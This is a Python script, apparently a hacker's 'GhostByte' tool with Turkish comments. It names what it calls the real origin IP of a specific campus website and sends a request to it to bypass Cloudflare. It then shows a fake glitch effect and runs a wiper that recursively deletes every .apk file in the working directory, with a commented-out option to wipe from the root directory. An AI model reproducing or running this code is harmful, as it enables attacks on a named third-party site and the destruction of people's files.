import os
import platform
import time

# --- HEDEF BİLGİLERİ ---
TARGET_IP = "85.111.76.66" # Bulduğumuz gerçek IP
TARGET_HOST = "www.morpakampus.com"
GHOST_SIGNATURE = "GhostByte was here."

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def glitch_effect():
    """Terminalde veya sistemde glitch efekti simülasyonu"""
    chars = ["@", "#", "$", "%", "&", "*", "!", "0", "1"]
    print("\n[!] GLITCH SYSTEM ACTIVATED...")
    for _ in range(20):
        line = "".join([chars[int((time.time()*100)%len(chars))] for _ in range(50)])
        print(f"\033[1;32m{line}\033[0m")
        time.sleep(0.05)

def wipe_apks(directory="."):
    """Belirtilen dizindeki tüm .apk dosyalarını yok eder"""
    print(f"\n[*] GhostByte Wiper Bashlatıldı: {directory} taranıyor...")
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".apk"):
                file_path = os.path.join(root, file)
                try:
                    os.remove(file_path)
                    print(f"\033[1;31m[DELETED]\033[0m {file_path}")
                    count += 1
                except Exception as e:
                    print(f"[-] Hata: {file_path} silinemedi: {e}")
    print(f"\n[+] Operasyon Tamamlandı. {count} APK dosyası buharlaştı.")

def network_ping():
    """Gerçek IP üzerinden sunucuya hayalet bir selam gönderir"""
    print(f"\n[*] Connecting to Origin IP: {TARGET_IP}...")
    # Cloudflare'i atlayarak doğrudan header gönderimi
    cmd = f"curl -s -H 'Host: {TARGET_HOST}' http://{TARGET_IP} > /dev/null"
    os.system(cmd)
    print("[+] Connection Established. Cloudflare bypassed.")

if __name__ == "__main__":
    clear_screen()
    print(f"--- GHOSTBYTE PROJECT: {GHOST_SIGNATURE} ---")
    
    # 1. Sunucuyla bağlantı kur (Bypass)
    network_ping()
    
    # 2. Glitch efektini başlat
    glitch_effect()
    
    # 3. Yıkım emrini uygula (Dikkat: Çalıştırdığın klasördeki APK'ları siler!)
    # wipe_apks("/") # <-- Tüm sistemi silmek için tehlikeli mod (Root gerekir)
    wipe_apks(".")  # Güvenli test modu: Sadece mevcut klasör
